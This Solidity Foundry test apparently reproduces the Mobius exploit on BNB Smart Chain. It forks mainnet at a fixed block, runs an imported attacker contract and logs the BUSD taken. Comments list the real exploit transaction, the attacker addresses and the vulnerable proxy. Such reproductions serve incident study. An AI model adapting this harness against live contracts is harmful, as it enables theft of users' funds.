// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IWBNB} from "../src/interfaces/IWBNB.sol";
import {IPancakeRouter} from "../src/interfaces/IPancakeRouter.sol";
import {IVulnerableProxy} from "../src/interfaces/IVulnerableProxy.sol";
import {AttackerContract} from "../src/AttackerContract.sol";

// Exploit Transaction: https://bscscan.com/tx/0x2a65254b41b42f39331a0bcc9f893518d6b106e80d9a476b8ca3816325f4a150
// Attacker Tornado Cash Fund Transaction: 0x491b6888843f260587e86efaa26b837c6a1c26d17442a526088bb2ec46ee828f
// Attacker: https://bscscan.com/address/0xb32a53af96f7735d47f4b76c525bd5eb02b42600
// Attackerâ€™s Contract: https://bscscan.com/address/0x631adff068d484ce531fb519cda4042805521641

// Contracts involved
// address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
// address constant router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
// address constant MBU = 0x0dFb6Ac3A8Ea88d058bE219066931dB2BeE9A581;
// address constant VulnerableProxy = 0x95e92B09b89cF31Fa9F1Eca4109A85F88EB08531;

contract MobiusExploit is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("https://bsc.drpc.org", 49470429);
        vm.deal(attacker, 1 ether);
    }

    function test_Exploit() public {
        vm.startPrank(attacker);

        AttackerContract attackCtr = new AttackerContract();
        attackCtr.attack{value: 1 ether}();

        console.log("Exploited amount:", IERC20(BUSD).balanceOf(attacker) / 1e18);
        vm.stopPrank();
    }
}
